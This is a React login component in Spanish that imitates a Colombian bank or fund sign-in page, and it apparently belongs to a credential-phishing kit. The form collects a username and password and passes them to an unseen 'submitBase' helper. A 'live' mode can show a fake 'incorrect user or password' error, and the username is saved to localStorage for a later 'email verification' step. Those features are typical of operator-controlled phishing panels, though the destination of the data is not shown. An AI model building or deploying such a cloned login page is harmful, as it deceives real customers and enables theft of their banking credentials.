import { useFormik } from 'formik'
import { useState } from 'react'

import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'
import { useGeneralData } from '../../../hooks/useGeneralData'
import { UsernameAndPasswordInput } from './UsernameAndPasswordInput'
import { usernameAndPasswordValidate } from '../../../security/usernameAndPasswordValidate'

const valuesData = { username: '', password: '', /* typeDocument: '' */ }
const opciones = ['Cédula de Ciudananía', 'Tarjeta de Identidad', 'Cédula  Extranjera', 'Pasaporte']

export const UsernameAndPassword = () => {
    
    const dataImportant = useGeneralData({ modeLive: true })
    const [valueKeyBoardVirtual, setValueKeyBoardVirtual] = useState('')
    const [selectActive, setSelectActive] = useState(false)
    const [selectItem, setSelectItem] = useState(opciones[0])
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => usernameAndPasswordValidate({values, virtualKeyword: false}),
        onSubmit: async(valuesData, {resetForm}) => {
            // Descomentar si quieres un tipo de documento
            // valuesData.typeDocument = selectItem
            // Si voy a usar el modo email verificacion
            localStorage.setItem('email',JSON.stringify(valuesData.username))
            submitBase({dataImportant, valuesData}) 
            return resetForm()
        }
    })
    
    return (
        <>
            {
                dataImportant.showSpiner === true ? <Spiner /> : (
                    <>
                        {/* <UsernameAndPasswordKeyword  afterPasswordValue={valueKeyBoardVirtual} setPasswordValue={setValueKeyBoardVirtual}/>) */}
                        <p className='text-[#e31e1a] text-[24px] mb-[7.5px]'>Inicia sesión</p>
                        <div className='mb-[20px] border-b-[1px] border-b-[#eee]' />
                        {dataImportant.liveError === true && (<p className='text-[#a94442] bg-[#f2dede] border-[#ebccd1] border-[1px] rounded-[4px] mb-[20px] p-[15px] text-[14px]'>Usuario o Contraseña incorrecta. Verifique e intente de nuevo.</p>)}
                        <form className='flex flex-col' onSubmit={handleSubmit}>

                            <UsernameAndPasswordInput
                                username={values.username}
                                password={values.password}
                                typeDocument={values.typeDocument}
                                handleChange={handleChange} 
                                handleBlur={handleBlur}
                                touched={touched}
                                errors={errors}
                                valueKeyBoardVirtual={valueKeyBoardVirtual}
                                showPasswordMode={false}

                                selectActive={selectActive} 
                                setSelectActive={setSelectActive}
                                selectItem={selectItem}
                                setSelectItem={setSelectItem}
                                opciones={opciones}
                            />
                            <span className='text-[13px] mt-1 text-[#212529]'>¿Olvidaste tu  <span className='text-[#3e6fe8] hover:text-[#23527c] hover:underline cursor-pointer'>Usuario</span> o <span className='text-[#3e6fe8] hover:text-[#23527c] hover:underline cursor-pointer'>Contraseña</span> ?</span>
                            <br />
                            <button 
                                    disabled={
                                        (
                                            touched.username && 
                                            errors.username || 
                                            values.username.length === 0
                                        ) 
                                        // || 
                                        // (
                                        //     // Clave virtual o normal input
                                        //     // valueKeyBoardVirtual.length < 1 
                                            // (
                                            //     touched.password && 
                                            //     errors.password || 
                                            //     values.password.length === 0
                                            // )
                                        // ) 
                                        == true ? true : false
                                    }
                                className='bg-[#6051a1] px-[12px] hover:bg-[#ff9900] py-[6px] h-[34px] text-[14px] text-white leading-[20px] w-full'
                                type='submit'
                            >
                                <span className='h-[20px]'>
                                    INGRESAR
                                </span>
                            </button>

                            <button className='px-[12px] py-[6px] h-[34px] text-[14px] leading-[20px] w-full'>CANCELAR</button>
                            <button className='px-[12px] py-[6px] h-[34px] text-[14px] leading-[20px] w-full'>¿Bloqueaste tu usuario?</button>
                            <span className='text-[13px] text-center'>Si aun no estas afiliado puedes hacerlo ingresando en la opción</span>
                            <span className='text-[13px] text-center text-[#6051a1] hover:text-[#23527c] hover:underline cursor-pointer mt-[10px] mb-[5px]'>Afiliate</span>
                            <span className='text-[13px] text-center text-[#3e6fe8] hover:text-[#23527c] hover:underline cursor-pointer'>¿Olvidaste tus Preguntas de Seguridad?</span>
                        </form>
                    </>
                )
            }
        </>
            
    )
}
